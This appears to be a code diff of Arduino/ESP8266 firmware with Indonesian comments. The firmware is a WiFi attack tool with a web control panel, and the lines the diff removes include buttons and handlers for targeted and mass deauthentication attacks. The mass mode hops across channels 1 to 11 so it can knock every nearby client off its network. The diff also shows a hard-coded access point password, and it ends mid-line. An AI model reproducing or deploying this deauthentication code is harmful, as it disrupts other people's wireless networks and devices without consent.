@@ -14,7 +14,8 @@
 #include <Attack.h>
 #include <Scan.h>
 
-// --- KONFIGURASI GLOBAL ---
+// --- KONFIGURASI ---
+// Variabel harus global agar bisa diakses oleh loop dan lambda
 const char* apSSID = "GMpro";
 const char* apPASS = "Sangkur87";
 const int LED_PIN = 2;
@@ -32,7 +33,7 @@ unsigned long lastHop = 0;
 unsigned long prevBlink = 0;
 int currentCh = 1;
 
-// --- UI WEB (Disimpan di PROGMEM) ---
+// --- UI WEB (HTML & CSS) ---
 const char INDEX_HTML[] PROGMEM = R"raw(
 <!DOCTYPE html>
 <html>
@@ -59,126 +60,4 @@ const char INDEX_HTML[] PROGMEM = R"raw(
         <div id="bt2" class="tab" onclick="sh(2)">SETTING</div>
     </div>
     <div id="t1" class="content active">
-        <button class="btn" onclick="sc()">SCAN & UNMASK HIDDEN</button>
-        <div id="wl"></div>
-        <hr style="border:0.5px solid #333">
-        <button id="atk1" class="btn" onclick="tk('deauth','atk1')">DEAUTH TARGET</button>
-        <button id="atk3" class="btn" onclick="tk('mass','atk3')">MASS DEAUTH RUSUH</button>
-        <div class="log-box" id="lg">Sistem Siap...</div>
-    </div>
-    <div id="t2" class="content">
-        <h3>Settings</h3>
-        <button class="btn" id="h_btn" onclick="toggleHidden()">SCAN MODE: NORMAL</button>
-    </div>
-    <script>
-        function sh(n){
-            document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
-            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
-            document.getElementById('t'+n).classList.add('active');
-            document.getElementById('bt'+n).classList.add('active');
-        }
-        function tk(ty, id){
-            let b=document.getElementById(id); b.classList.toggle('on');
-            let s=b.classList.contains('on')?'START':'STOP';
-            fetch('/cmd?type='+ty+'&do='+s);
-            log("Sistem: "+ty+" "+s);
-        }
-        function toggleHidden(){
-            let b=document.getElementById('h_btn');
-            let m=(b.innerText=="SCAN MODE: NORMAL")?"on":"off";
-            fetch('/hscan?m='+m);
-            b.innerText=(m=="on")?"SCAN MODE: DEEP":"SCAN MODE: NORMAL";
-            b.style.color=(m=="on")?"yellow":"#0f0";
-        }
-        function sc(){ log("Scanning..."); fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('wl').innerHTML=d;}); }
-        function log(m){ let l=document.getElementById('lg'); l.innerHTML+="<br>> "+m; l.scrollTop=l.scrollHeight; }
-    </script>
-</body>
-</html>
-)raw";
-
-void setup() {
-    Serial.begin(115200);
-    pinMode(LED_PIN, OUTPUT);
-    
-    if(!LittleFS.begin()) Serial.println("LittleFS Mount Failed");
-
-    // --- INISIALISASI SDK ---
-    scanObj.begin();
-    attack.begin();
-
-    // 1. WiFi Admin
-    WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP(apSSID, apPASS, 1, 0); 
-    dnsServer.start(53, "*", WiFi.softAPIP());
-
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-        request->send_P(200, "text/html", INDEX_HTML);
-    });
-
-    // Perbaikan Capture Clause [=] agar bisa akses global object
-    server.on("/scan", HTTP_GET, [=](AsyncWebServerRequest *request){
-        scanObj.start(0); 
-        String out = "<div class='wifi-row' style='background:#222'><div>SSID</div><div>CH</div><div>SIG</div><div>SEL</div></div>";
-        for(int i=0; i<scanObj.count(); i++){
-            String name = scanObj.getSSID(i);
-            if(name == "" || name.length() == 0) name = "[HIDDEN]";
-            out += "<div class='wifi-row'><div>" + name + "</div><div>" + String(scanObj.getChannel(i)) + "</div><div>" + String(scanObj.getRSSI(i)) + "</div><div><input type='checkbox'></div></div>";
-        }
-        request->send(200, "text/plain", out);
-    });
-
-    server.on("/hscan", HTTP_GET, [](AsyncWebServerRequest *request){
-        if(request->hasParam("m")) scanHidden = (request->getParam("m")->value() == "on");
-        request->send(200, "text/plain", "OK");
-    });
-
-    server.on("/cmd", HTTP_GET, [=](AsyncWebServerRequest *request){
-        String type = request->getParam("type")->value();
-        String action = request->getParam("do")->value();
-        
-        if(type == "mass") {
-            massDeauth = (action == "START");
-            if(!massDeauth) attack.stopAll();
-            blinkInterval = massDeauth ? 80 : 1000;
-        } else if(type == "deauth") {
-            if(action == "START") {
-                attack.start(true, false, false, false, 0); 
-                blinkInterval = 150;
-            } else {
-                attack.stopAll();
-                blinkInterval = 1000;
-            }
-        }
-        request->send(200, "text/plain", "OK");
-    });
-
-    server.begin();
-}
-
-void loop() {
-    dnsServer.processNextRequest();
-
-    // 2. LOGIKA MASS DEAUTH + CHANNEL HOPPING
-    if (massDeauth) {
-        unsigned long now = millis();
-        if (now - lastHop >= 200) { 
-            lastHop = now;
-            currentCh++;
-            if (currentCh > 11) currentCh = 1;
-            
-            wifi_set_channel(currentCh);
-            
-            if (currentCh != 1) { 
-                attack.start(true, false, false, false, 0); 
-            }
-        }
-    }
-
-    // 3. LOGIKA LED
-    unsigned long cur = millis();
-    if (cur - prevBlink >= (unsigned long)blinkInterval) {
-        prevBlink = cur;
-        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
-    }
-}
+        <button class="btn" onclick="sc()">
